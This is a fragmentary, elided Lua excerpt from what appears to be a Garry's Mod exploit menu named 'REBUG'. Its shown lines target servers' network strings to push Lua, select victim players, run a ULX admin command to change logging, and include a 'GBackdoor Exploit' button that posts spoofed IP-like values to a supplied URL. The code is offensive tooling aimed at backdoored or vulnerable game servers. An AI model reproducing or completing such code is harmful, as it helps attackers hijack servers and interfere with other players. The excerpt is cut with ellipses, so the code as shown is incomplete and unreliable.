...
function noob.PostLua( str )
	...
	if (channel == "") then chat.AddText( Color( 255, 0, 0), "[REBUG]", Color( 20, 150, 200 )	," You are not targeting a NetString") return end
...
selPly = v:UserID() targeting:SetText("Selected: " .. Player(selPly):Name()) 
...
helpimretarded2.DoClick = function()
	...
	timer.Simple( 1, function() RunConsoleCommand( "ulx", "logecho", "1" ) end )
...
rebug.AddButton("GBackdoor Exploit", bar4, function()
	...
	http.Post(""..str,{nb = 27,i = math.random(1,99999)..'.'..math.random(1,99999)..'.'..math.random(1,99999),
